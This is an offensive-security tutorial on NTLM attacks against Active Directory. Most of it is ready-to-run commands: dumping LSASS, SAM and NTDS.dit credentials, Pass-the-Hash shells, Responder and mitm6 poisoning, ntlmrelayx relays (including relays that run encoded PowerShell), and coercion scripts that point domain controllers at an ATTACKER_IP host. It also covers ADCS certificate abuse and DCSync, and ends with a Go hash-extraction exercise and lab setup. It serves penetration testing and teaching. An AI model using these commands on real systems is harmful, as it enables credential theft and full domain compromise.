NTLM Attacks

NTLM exploitation, from hash extraction and Pass-the-Hash to relay attacks, coercion, A DC S abuse, and DC Sync.

Overview

NTLM proves possession of a password hash without ever sending the hash or the password. That design makes the hash itself a reusable credential and makes the authentication exchange relayable. This article extracts hashes from memory, the registry, and the domain database; reuses them directly with Pass-the-Hash; captures and relays authentication; coerces privileged machines into authenticating; and abuses certificate services and replication to escalate to Domain Admin.

The NTLM Protocol

NTLM is a challenge-response authentication protocol that proves possession of a password hash without transmitting the hash or password. It operates over SMB , HTTP , MSS QL, LDAP , RPC , SMTP , POP, IMAP , and any application that calls SSPI (Security Support Provider Interface).

NTLMv2 Authentication Flow:

1. Client -> Server:  Type 1 - Negotiate
   (Client capabilities, domain name, workstation name)

2. Server -> Client:  Type 2 - Challenge
   (Server nonce (8 bytes for NTLMv1, variable for NTLMv2),
    server name, domain name, negotiated flags)

3. Client -> Server:  Type 3 - Authenticate
   (Username, domain name, NT/LM responses, client nonce,
    timestamp (NTLMv2), target info, encrypted session key)

NTLMv2 Response = HMAC-MD5(
    NT-Hash || Upper(Username) || domain,
    Server-Challenge || Client-Nonce || Timestamp || Target-Info
)

The NT-Hash = MD4(Unicode(password))

The NT hash (MD4 of the Unicode password) is the foundation of all NTLM authentication. It is unsalted, uniterated, and computed once per password. If you have the NT hash, you never need the plaintext password for NTLM -based authentication - this is Pass-the-Hash .

NTLMv1 vs NTLMv2

Property NTLMv1 NTLMv2
Hash function DES (with LM/NT hash) HMAC-MD5
Client nonce 8 bytes (static) 8 bytes (per-request)
Timestamp No Yes (mitigates replay)
Target info No Server name, domain, DNS info
Server challenge 8 bytes 8 bytes
Cracking feasibility Trivial -> DES key space is 2^56 Crackable with GPU (hashcat -m 5600)
Enabled by default Disabled since Windows 2008 R2 Enabled

NTLM v1 is trivially crackable because the LM/ NTLM v1 response halves are 8 bytes each, encrypted with single DES (56-bit key), and the DES key is derived from the first 7 bytes of the LM/NT hash. With a fixed client nonce and no timestamp, a single rainbow table or GPU crack (hashcat -m 5500) recovers most passwords in minutes.

NTLM Hash Extraction

The NT hash is stored in the SAM registry hive (local accounts), the NTDS.dit database (domain accounts), or in memory ( LSASS process). Each source requires a different extraction technique.

From LSASS Memory

# On a compromised Windows host (requires local admin/SYSTEM):
# Method 1 - mimikatz (on the target)
# mimikatz # privilege::debug
# mimikatz # sekurlsa::logonpasswords
# Output includes: User, Domain, LM hash, NT hash, SHA1, DPAPI keys
# NT hash is the field after the second colon (LM:NT)

# Method 2 - Dump LSASS process memory and extract offline
# On the target (Windows, admin):
# Find LSASS PID:
tasklist | findstr lsass
# Create a minidump:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\dump\lsass.dmp full
# Transfer lsass.dmp to your Linux box

# Extract credentials from the dump with pypykatz:
pip install pypykatz
pypykatz lsa minidump lsass.dmp

# pypykatz extracts:
#   - Logon sessions (users, domains, NT hashes, SHA1 hashes)
#   - Kerberos keys (AES128/AES256, DES)
#   - DPAPI master keys
#   - Credential Manager entries (RDP passwords, saved web passwords)
#   - MSTSC (RDP client) connection strings
						
# Method 3 - nanodump (stealthier, operates via LSASS process hollowing)
# On the target (Windows): nanodump.exe --write C:\dump\lsass.dmp
# Transfer the dump. Extract same as above with pypykatz.

From the SAM Registry Hive

# On a compromised Windows host (requires SYSTEM):
# Method 1 - Dump SAM and SYSTEM hives from the registry
reg save HKLM\SAM C:\dump\sam.save
reg save HKLM\SYSTEM C:\dump\system.save
# Transfer both files to attacker machine

# Extract hashes with secretsdump.py
secretsdump.py -sam sam.save -system system.save LOCAL

# Method 2 - Direct extraction via secretsdump on the live system
secretsdump.py corp.local/jsmith:password@TARGET-PC.corp.local
# Extracts SAM hashes (local accounts) and cached domain logon hashes
# (mscash / DCC2 - hashcat mode 2100)

From NTDS.dit (the Domain Database)

# Requires Domain Admin or equivalent on a Domain Controller
# Method 1 - secretsdump.py with credentials
secretsdump.py -just-dc corp.local/administrator:password@dc01.corp.local

# Method 1b - Dump only specific users (quieter, faster)
secretsdump.py -just-dc-user administrator corp.local/administrator:password@dc01.corp.local
secretsdump.py -just-dc-user krbtgt corp.local/administrator:password@dc01.corp.local

# Method 2 - Dump via DCSync (requires Replicating Directory Changes rights)
# This approach mimics a DC replication request and does not touch the DC's filesystem
secretsdump.py -just-dc-user administrator 'corp.local/user_with_dcsync_rights:password'@dc01.corp.local

# Method 3 - Volume Shadow Copy (on the DC itself)
# vssadmin create shadow /for=C:
# copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\dump\ntds.dit
# reg save HKLM\SYSTEM C:\dump\system.save
# Then offline extraction:
secretsdump.py -ntds ntds.dit -system system.save LOCAL

# Method 4 - Invoke-NinjaCopy (PowerShell, bypasses file locks on NTDS.dit)
# Utilizes the volume shadow copy mechanism silently

Pass-the-Hash (PtH)

Pass-the-Hash uses the NT hash directly in the NTLM authentication handshake without knowing the plaintext password. The NT hash IS the precomputed response to the server challenge - the authentication process only needs the hash to compute the NTLM v2 response.

Services that accept NTLM authentication over the network (and therefore accept PtH):

Service Port Tool Notes
SMB TCP 445 psexec.py, smbexec.py, crackmapexec, wmiexec.py Most reliable. Administrative shares required for PsExec-style code execution.
WMI TCP 135 + dynamic wmiexec.py, crackmapexec DCOM-based. No service creation, no disk artifacts. Quieter than PsExec.
WinRM TCP 5985/5986 evil-winrm PowerShell Remoting. Requires the user to be in Remote Management Users or local Administrators.
RDP TCP 3389 xfreerdp /pth Requires Restricted Admin mode enabled (DisableRestrictedAdmin=0).
MSSQL TCP 1433 mssqlclient.py Requires the user to be a SQL login or mapped Windows login.
SSH TCP 22 Built-in if AD-integrated SSH Rare. Requires OpenSSH configured with SSPI authentication. 
# PtH with crackmapexec (SMB)
crackmapexec smb 10.0.0.50 -u jsmith -H :ntlm_hash -d corp.local

# PtH with crackmapexec (WinRM)
crackmapexec winrm 10.0.0.50 -u jsmith -H :ntlm_hash -d corp.local

# PtH with crackmapexec (MSSQL)
crackmapexec mssql 10.0.0.50 -u sa -H :ntlm_hash

# PtH - interactive shell via PsExec
psexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50

# PtH - interactive shell via WMI (no service, no disk, quieter)
wmiexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50

# PtH - interactive shell via SMBExec (executes via SMB named pipe)
smbexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50

# PtH - execute a single command (AT scheduled task)
atexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50 'whoami /all'

# PtH - execute via DCOM
dcomexec.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50

# PtH - dump SAM from target
secretsdump.py -hashes :ntlm_hash corp.local/jsmith@10.0.0.50
						
# PtH with evil-winrm (WinRM / PowerShell Remoting)
evil-winrm -i 10.0.0.50 -u jsmith -H ntlm_hash

# PtH with xfreerdp (RDP - Restricted Admin mode required)
xfreerdp /v:10.0.0.50 /u:jsmith /pth:ntlm_hash
# If Restricted Admin is disabled, this will fail with "account restrictions are preventing"

# Check if Restricted Admin is enabled via crackmapexec
crackmapexec smb 10.0.0.50 -u jsmith -H :ntlm_hash -d corp.local -M rdp
# Or via registry query: HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0
						
# PtH - bulk execution: test a hash against a subnet
crackmapexec smb 10.0.0.0/24 -u administrator -H :ntlm_hash --local-auth

# --local-auth: use the local SAM (.\Administrator), not the domain
# Remove --local-auth for domain authentication

Why PtH Works on Some Services

PtH works because the NTLM challenge-response protocol uses the hash as the input to the response computation. It does not require the plaintext password at any point.

PtH fails in these cases:

  1. Kerberos is enforced - The service requires a Kerberos ticket, not NTLM . Request a TGT from the hash first (Overpass-the-Hash).
  2. Restricted Admin mode for [RDP]{Remote Desktop Protocol} is disabled - Without Restricted Admin, RDP requires the plaintext password for the interactive logon process.
  3. Credential Guard is enabled - Credential Guard isolates LSASS in a Hyper-V VM . The NT hash is never exposed in user-accessible memory, so only Kerberos tickets can be extracted.

SMB signing does not stop PtH (the client derives the session key from the hash), but it does stop NTLM relay, because the relayed session never holds the key.

NTLM Relay

NTLM relay intercepts a client's challenge-response authentication and forwards it to another service that the client's account has access to. The victim authenticates to you; you relay that authentication to the target service. You never crack a hash - you weaponize the authentication in transit.

NTLM Relay Attack Flow:

Victim Client            Attacker (Relay)           Target Server
     |                          |                         |
     |--- Type 1 (Negotiate) -->|                         |
     |                          |--- Type 1 (Negotiate) ->|
     |                          |<-- Type 2 (Challenge) --|
     |<-- Type 2 (Challenge) ---|                         |
     |--- Type 3 (Response) --->|                         |
     |                          |--- Type 3 (Response) -->|
     |                          |<-- Authenticated --------|

The attacker sits in the middle, forwarding the challenge from the target server to the victim client, and forwarding the victim's response back to the target server. The attacker never learns the hash or password - they simply relay the session.

Forcing Authentication

Before you can relay, a victim must authenticate to your machine. You either poison name resolution requests or coerce a machine into authenticating.

Name Resolution Poisoning

# Responder listens on the local network and poisons name resolution queries.
# When any Windows host tries to resolve a nonexistent hostname (typo, stale
# mapping, DNS failure), LLMNR, NBT-NS, and mDNS broadcasts are sent.
# Responder answers those broadcasts, claiming to be the requested host,
# and captures the victim's Net-NTLM hash.

# Launch Responder on the attacker's interface
sudo responder -I eth0 -v

# What Responder captures:
#   - NTLMv2 hashes from SMB, HTTP, LDAP, MSSQL, FTP poison responses
#   - Cleartext credentials from HTTP POST (if the victim sends basic auth)
#   - WPAD.dat (Web Proxy Auto-Discovery) requests -> can serve a malicious PAC file
#   - Print requests (MS-RPRN server)
						
# For combined relay + poisoning attacks, DISABLE SMB and HTTP servers in Responder
# (otherwise Responder captures the hash instead of letting ntlmrelayx relay it)
sudo vi /etc/responder/Responder.conf
# Set:
#   SMB = Off
#   HTTP = Off
# Then launch ntlmrelayx separately for relaying.
						
# WPAD poisoning - Responder answers WPAD name resolution queries, and when
# the victim fetches http://wpad/wpad.dat, Responder serves a malicious PAC
# that proxies web traffic through your machine OR captures Net-NTLM via
# HTTP 401 WWW-Authenticate: NTLM
sudo responder -I eth0 -w On
# -w : Start the WPAD rogue proxy server

IPv6 Poisoning with mitm6

# mitm6 takes over IPv6 configuration on the local network.
# Windows prefers IPv6 over IPv4 when both are available. mitm6 answers
# DHCPv6 requests and becomes the IPv6 DNS server for all victims -
# redirecting their WPAD queries to your machine.
pip install mitm6
sudo mitm6 -i eth0 -d corp.local

# mitm6 + ntlmrelayx combination:
#   mitm6 pushes a WPAD config -> victims use your HTTP proxy ->
#   HTTP proxy requests NTLM auth -> relay to LDAP/SMB/HTTP/ADCS

ntlmrelayx - The Swiss Army Knife

# Basic NTLM relay - relay captured hashes to SMB on a target
ntlmrelayx.py -t smb://10.0.0.50 -smb2support

# -t : relay target (where to forward the authentication)
# -smb2support : enable SMBv2 protocol support
# If authentication succeeds against 10.0.0.50, ntlmrelayx dumps the SAM hashes.

# Relay to SMB and execute a command on successful auth
ntlmrelayx.py -t smb://10.0.0.50 -smb2support -c 'powershell -enc <BASE64>'

# Relay to LDAP - dump domain information
ntlmrelayx.py -t ldap://10.0.0.1

# Relay to LDAP on the DC - add a computer account to the domain
ntlmrelayx.py -t ldaps://10.0.0.1 --add-computer EVIL-MACHINE

# Relay to LDAP - delegate access (RBCD: Resource-Based Constrained Delegation)
ntlmrelayx.py -t ldaps://10.0.0.1 --delegate-access

# Relay to LDAP - add a user to a group (e.g., Domain Admins)
ntlmrelayx.py -t ldaps://10.0.0.1 --escalate-user EVIL-MACHINE\$

# Relay to LDAP - set shadow credentials (certificate-based auth via Key Trust)
ntlmrelayx.py -t ldaps://10.0.0.1 --shadow-credentials --shadow-target TARGET-USER

# Relay to ADCS HTTP endpoint - request a certificate
ntlmrelayx.py -t http://10.0.0.1/certsrv/certfnsh.asp --adcs
						
# Relay to MSSQL
ntlmrelayx.py -t mssql://10.0.0.50 -q 'EXEC xp_cmdshell "whoami"'

# Relay to IMAP
ntlmrelayx.py -t imap://10.0.0.50 -q 'list "" "*"'

# Multi-target relay - relay to a list of targets
ntlmrelayx.py -tf targets.txt -smb2support
# targets.txt format: smb://10.0.0.50
#                     smb://10.0.0.51
#                     ldaps://10.0.0.1

Relay to LDAP - Deep Dive

LDAP relay is the most powerful relay target. It does not require the relayed user to be a local admin on any machine - only to have Write permissions in LDAP over a useful object.

# Relay a Domain Admin's authentication to LDAP on the DC.
# LDAP signing and channel binding are not enforced by default on most
# domains. When LDAP signing is required, relay to LDAP fails; when channel
# binding (EPA) is required, relay to LDAPS fails as well. Check the
# directory's policy before assuming either target is open.
ntlmrelayx.py -t ldaps://10.0.0.1 --add-computer EVIL-MACHINE
# Adds computer object EVIL-MACHINE$ to the domain.

ntlmrelayx.py -t ldaps://10.0.0.1 --escalate-user EVIL-MACHINE\$
# Adds EVIL-MACHINE$ to Domain Admins (requires the relayed user to have
# AddMember on the Domain Admins group - typically only Domain Admins themselves).

Relay Target Selection - Who Matters

The relay is only useful if the relayed account has administrative privileges on the target. Common scenarios:

# Relay a Domain Admin's Net-NTLM to SMB on a workstation -> SAM dump
# Relay a Domain Admin's Net-NTLM to LDAPS -> add computer, escalate users
# Relay a machine account (DC$) to LDAPS -> add users, delegate access
# Relay ANY privileged account to ADCS -> request certificate -> PKINIT authentication

Relay Mitigations and Their Bypasses

Mitigation How It Blocks Bypass
SMB Signing Prevents relay to SMB (server signs all messages; relay cannot sign because it lacks the shared session key) Use relay to LDAP/LDAPS or HTTP/ADCS instead. SMB signing is required on DCs by default since 2019.
LDAP Signing Prevents relay to LDAP (same mechanism as SMB signing) Use relay to LDAPS (TLS-encrypted LDAP). LDAP channel binding (CBT) still applies.
LDAP Channel Binding (CBT) Binds the LDAP session to the TLS channel -> if relayed, the underlying TLS channel differs Relay to a service that does NOT enforce channel binding (ADCS web enrollment does not).
EPA (Extended Protection for Authentication) Binds the authentication to the TLS channel (same as CBT for HTTP) Relay to services without EPA support (non-IIS servers, legacy apps).
Microsof's 2019 patch (CVE-2019-1040) Removes the Message Integrity Code (MIC) bypass -> patches a flaw that allowed stripping the MIC from NTLM messages Use Drop-the-MIC (if unpatched), or target patched systems differently.

Capturing and Cracking Net-NTLM Hashes

Net- NTLM v2 hashes are crackable offline. The format includes the server challenge and the client response.

Net-NTLMv2 hash format:
username::domain:server_challenge:nt_response:client_challenge
OR:
username::domain:server_challenge:HMAC_MD5_part:NTProofStr_rest

Responder output format:
jsmith::corp:1122334455667788:AB12CD34...:EF56GH78...

Hashcat mode 5600 = NetNTLMv2
						
# Capture Net-NTLMv2 with Responder
sudo responder -I eth0 -v
# Hashes are saved to /usr/share/responder/logs/SMB-NTLMv2-*.txt

# Crack with hashcat
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.0.txt \
    /usr/share/wordlists/rockyou.txt --force

# -m 5600 = NetNTLMv2
# -m 5500 = NetNTLMv1 (hashcat or John; NTLMv1 is trivially crackable)

Authentication Coercion

Coercion techniques force a privileged machine (often a Domain Controller) to initiate an SMB or HTTP connection to your attacker machine. This triggers NTLM authentication, which you then relay or capture.

PetitPotam

PetitPotam exploits the EFS RPC interface on Windows. The EfsRpcOpenFileRaw function accepts a UNC path and causes the target to authenticate to that path over SMB .

# PetitPotam coercion - force a DC to authenticate to your relay server
python3 PetitPotam.py -u jsmith -p password -d corp.local \
    ATTACKER_IP dc01.corp.local

# Or without credentials (some older/unpatched servers):
python3 PetitPotam.py ATTACKER_IP dc01.corp.local

# The DC's machine account (DC01$) authenticates to ATTACKER_IP over SMB.
# ntlmrelayx captures or relays this authentication.
						
# Combined PetitPotam + NTLM relay attack chain:
# Terminal 1 - ntlmrelayx relay to LDAPS on the DC
ntlmrelayx.py -t ldaps://10.0.0.1 --add-computer EVIL-MACHINE -smb2support

# Terminal 2 - trigger authentication with PetitPotam
python3 PetitPotam.py ATTACKER_IP 10.0.0.1
# The DC authenticates to us. We relay to LDAPS on the DC.
# We add a computer account EVIL-MACHINE$.
# Now EVIL-MACHINE$ exists -> RBCD attack path is open.

PrinterBug

The RpcRemoteFindFirstPrinterChangeNotification function over MS-RPRN forces the print spooler service to authenticate to an arbitrary host.

# PrinterBug coercion
python3 printerbug.py corp.local/jsmith:password@dc01.corp.local ATTACKER_IP

# Combined with relay: same pattern as PetitPotam
# Terminal 1: ntlmrelayx.py -t ldaps://10.0.0.1 --delegate-access
# Terminal 2: printerbug.py corp.local/user:pass@dc01.corp.local ATTACKER_IP

DFSCoerce

DFSCoerce exploits the NetrDfsRemoveStdRoot or NetrDfsAddStdRoot methods over MS-DFSNM to force authentication.

# DFSCoerce coercion
python3 dfscoerce.py -d corp.local -u jsmith -p password dc01.corp.local ATTACKER_IP

ShadowCoerce

python3 shadowcoerce.py -d corp.local -u jsmith -p password dc01.corp.local ATTACKER_IP

ADCS Attacks

A DC S issues X.509 certificates for TLS , code signing, smart card logon, and Kerberos PKI NIT authentication. When misconfigured, A DC S becomes the most reliable path to Domain Admin through certificate enrollment abuse.

Core concept : If you can request a certificate with an arbitrary Subject Alternative Name (SAN) for a high-value target (Domain Admin), you can use that certificate to authenticate as that user via Kerberos PKI NIT or Schannel.

ESC1

ESC1 occurs when an Enterprise CA has the "Web Enrollment" role installed AND a certificate template allows the enrollee to supply a Subject Alternative Name (SAN) AND the template is configured for client authentication.

# certipy - the primary tool for ADCS exploitation
pip install certipy-ad

# Step 1 - Enumerate ADCS infrastructure
certipy find -u jsmith@corp.local -p password -dc-ip 10.0.0.1 -ns 10.0.0.1
# Outputs certificates.zip with JSON/HTML/text reports of the ADCS configuration.
# Look for ESC1-ESC13 vulnerabilities in the text report.

# Step 2 - Identify an ESC1-vulnerable template
# certipy's output marks vulnerable templates with "ESC1" flag.
# Required conditions for ESC1:
#   1. ENROLLEE_SUPPLIES_SUBJECT flag is set in mspki-certificate-name-flag
#   2. The template has Client Authentication EKU (1.3.6.1.5.5.7.3.2)
#   3. Enrollment permissions granted to Domain Users or a group you belong to

# Step 3 - Request a certificate as a Domain Admin (ESC1)
certipy req -u jsmith@corp.local -p password -dc-ip 10.0.0.1 -ns 10.0.0.1 \
    -ca CORP-CA -template VulnerableTemplate \
    -upn administrator@corp.local
# -upn : specifies the User Principal Name in the certificate's SAN.
#        The CA honors it because ENROLLEE_SUPPLIES_SUBJECT is enabled.

# Step 4 - Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# Performs Kerberos PKINIT - obtains a TGT by presenting the certificate.
# Output: administrator.ccache (TGT for the Administrator user)

# Step 5 - Use the TGT
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass dc01.corp.local

ESC1 via NTLM Relay

# If you cannot authenticate to ADCS directly, relay a coerced authentication
# from a Domain Controller or Domain Admin to the ADCS HTTP endpoint.

# Terminal 1 - ntlmrelayx relaying to ADCS
ntlmrelayx.py -t http://10.0.0.1/certsrv/certfnsh.asp --adcs \
    --template DomainController

# Terminal 2 - Coerce authentication from a DC
python3 PetitPotam.py ATTACKER_IP 10.0.0.1

# When ESC1 conditions are met, ntlmrelayx requests a certificate as the
# relayed principal (e.g., DC01$), which can be used for PKINIT.

ESC2-ESC13 Quick Reference

ESC Path Condition Impact
ESC1 Template allows SAN specification + Client Auth EKU Certificate for any user
ESC2 Template allows SAN specification + Any Purpose EKU (2.5.29.37.0) Certificate for any user, wider scope
ESC3 Enrollment Agent template + another template Request certificate on behalf of any user
ESC4 Write permissions on a template (modify msPKI-*) Modify template to be ESC1-vulnerable
ESC5 Control over the CA server or PKI objects Full CA compromise
ESC6 CA flag: EDITF_ATTRIBUTESUBJECTALTNAME2 SAN can be supplied regardless of template settings
ESC7 Manage CA role (approve pending requests) Approve a malicious certificate request
ESC8 HTTP web enrollment without EPA (Extended Protection) NTLM relay to HTTP enrollment endpoint
ESC9 No security extension (CT_FLAG_NO_SECURITY_EXTENSION) Bypass certificate mapping checks
ESC10 Weak certificate mappings (User Principal Name) Impersonate a user with an alternate UPN
ESC11 NTLM relay to ICPR (ICertPassage RPC) Relay enrollment to a CA over RPC
ESC12 Shell access to CA server + CA certificate Offline CA certificate theft
ESC13 OID group linking via issuance policy Certificate-based group membership 
# ESC4 - Modify a template (requires WriteOwner or GenericAll on the template)
certipy template -u jsmith@corp.local -p password -dc-ip 10.0.0.1 \
    -template VulnerableTemplate -save-old
# Modifies the template to be ESC1-vulnerable, then revert with -restore.

# ESC6 - Abuse EDITF_ATTRIBUTESUBJECTALTNAME2
certipy req -u jsmith@corp.local -p password -dc-ip 10.0.0.1 \
    -ca CORP-CA -template User -upn administrator@corp.local

# ESC7 - Manage CA (approve a pending request)
certipy ca -u jsmith@corp.local -p password -dc-ip 10.0.0.1 \
    -ca CORP-CA -issue-request <request_id>

# ESC8 - NTLM relay to ADCS HTTP (same as ESC1 relay above)

# Shadow Credentials (a separate technique, not an ESC): add a Key Credential
# to a target account so it can be authenticated with a certificate.
certipy shadow auto -u jsmith@corp.local -p password \
    -account target_user -dc-ip 10.0.0.1

DCSync

DC Sync impersonates a Domain Controller and requests replication of domain credentials via the MS-DRSR (Directory Replication Service Remote) protocol. The attacking machine sends DsGetNCChanges to a real DC , which responds with the requested objects' attributes - including password hashes.

Required privilege : DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights on the domain root object. By default, these rights are granted to Domain Admins, Enterprise Admins, Administrators, and Domain Controllers. Any other group or user with these rights delegated can also DC Sync.

# DCSync - dump all domain credentials
secretsdump.py -just-dc corp.local/user_with_dcsync_rights:password@dc01.corp.local

# DCSync - dump only specific accounts (quieter)
secretsdump.py -just-dc-user krbtgt corp.local/user_with_dcsync_rights:password@dc01.corp.local
secretsdump.py -just-dc-user administrator corp.local/user_with_dcsync_rights:password@dc01.corp.local

# DCSync using NT hash instead of password
secretsdump.py -just-dc -hashes :ntlm_hash corp.local/user@dc01.corp.local

# DCSync using Kerberos ticket
secretsdump.py -k -no-pass dc01.corp.local
						
# Enumerate accounts with DCSync rights via BloodHound:
# MATCH (u:User)-[r:GetChanges|GetChangesAll]->(d:Domain)
# RETURN u.name, type(r)

# Or find groups with DCSync via ldapsearch:
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=group)(|(ntSecurityDescriptor=*DS-Replication-Get-Changes*)(ntSecurityDescriptor=*DS-Replication-Get-Changes-All*)))" \
    cn samaccountname 2>/dev/null
						
# Granting DCSync rights (requires Domain Admin or ACL Write on the domain root)
# Using Powerview on a Windows host:
# Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
#     -PrincipalIdentity jsmith \
#     -Rights DCSync

# Using Impacket's dacledit.py (alternative)
dacledit.py -action write -principal jsmith -target-dn 'DC=corp,DC=local' \
    -dc-ip 10.0.0.1 corp.local/administrator:password \
    -rights DCSync
# Then DCSync as jsmith.

Common Mistakes

Pass-the-Hash with an empty LM hash incorrectly formatted. The correct format is :NTHASH (colon before the hash). Formatting the hash without the leading colon ( NTHASH ) causes the impacket tools to interpret it as the NT part of a malformed hash and fail. Always include the leading colon.

NTLM relay - using default Responder config. Responder's default configuration runs its own SMB and HTTP servers, which C APT URE the credential rather than letting ntlmrelayx relay it. Disable SMB and HTTP in /etc/responder/Responder.conf before launching a relay attack, or use --lm in ntlmrelayx to ignore Responder's own hashes.

Relay target selection - relaying to a DC over SMB with SMB signing enforced. Since Windows Server 2019, SMB signing is required on all DC s. Relay to SMB on a DC will fail. Use LDAP S (port 636) or HTTP /A DC S as the relay target instead.

DCSync - using an account that has DCSync rights but attempting to replicate a DC. DC Sync works against any writable DC , not read-only DC s (RO DC ). If the only available DC is an RO DC , DC Sync will fail. Verify the DC type with nltest /dsgetdc:corp.local or check the isGlobalCatalogReady RootDSE attribute.

ADCS ESC1 - certificate not usable for Kerberos PKINIT. The certificate must have the Smart Card Logon EKU (1.3.6.1.4.1.311.20.2.2) or Client Authentication EKU (1.3.6.1.5.5.7.3.2). A certificate with only the Server Authentication EKU (1.3.6.1.5.5.7.3.1) cannot be used for PKI NIT. Verify with:

certipy auth -pfx certificate.pfx -dc-ip 10.0.0.1
# If it fails: the certificate lacks the required EKU.

Responder running on the wrong interface. Responder defaults to -I eth0 . If your attacker machine uses a different interface (e.g., tun0 for VPN , wlan0 for WiFi), specify it explicitly with -I .

Challenge

Write a Go tool that parses a secretsdump.py output file and extracts every usable NT hash. Each line has the form username:RID:LM:NT::: . Skip lines whose NT field is not 32 hex characters, write username:NT lines to stdout for hashcat, and report any NT hash that is shared by more than one account, which reveals password reuse.

package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

func main() {
	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer file.Close()

	seen := map[string][]string{}
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		fields := strings.Split(scanner.Text(), ":")
		if len(fields) < 4 {
			continue
		}
		user, nt := fields[0], fields[3]
		if len(nt) != 32 {
			continue
		}
		fmt.Printf("%s:%s\n", user, nt)
		seen[nt] = append(seen[nt], user)
	}

	fmt.Fprintln(os.Stderr, "Reused NT hashes:")
	for hash, users := range seen {
		if len(users) > 1 {
			fmt.Fprintf(os.Stderr, "  %s... shared by %s\n", hash[:8], strings.Join(users, ", "))
		}
	}
}

Build it, run it against a dump, and crack the resulting list with hashcat -m 1000 . Hashcat accepts the username:hash form.

NTLM attacks cannot be practiced in a lightweight container: they need a full Active Directory domain. Minimum lab:

  • 1 Windows Server 2022 Domain Controller with ADCS installed for ESC practice
  • 1 Windows 10/11 workstation
  • 1 Linux attacker VM on the same network segment
  • LLMNR and NBT-NS enabled on the workstations (default in Windows)
  • SMB signing not required on the workstation (default)
  • Web Enrollment role installed on the ADCS server (for ESC1 and ESC8)
